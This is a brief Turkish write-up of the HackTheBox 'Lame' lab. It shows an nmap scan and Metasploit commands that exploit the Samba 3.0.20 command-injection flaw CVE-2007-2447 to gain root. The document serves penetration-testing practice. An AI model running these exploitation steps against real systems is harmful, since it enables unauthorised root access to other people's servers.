# Lame — HackTheBox

**Zorluk:** Kolay · **Konu:** Linux, Samba

## Keşif

```bash
nmap -sV -p- 10.10.10.3
```

139/445 (Samba) ve 21 (FTP) portları açık.

## Sömürü

Samba 3.0.20 sürümündeki komut enjeksiyonu (CVE-2007-2447) kullanıldı.

```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
run
```

## Sonuç

Doğrudan `root` erişimi elde edildi.
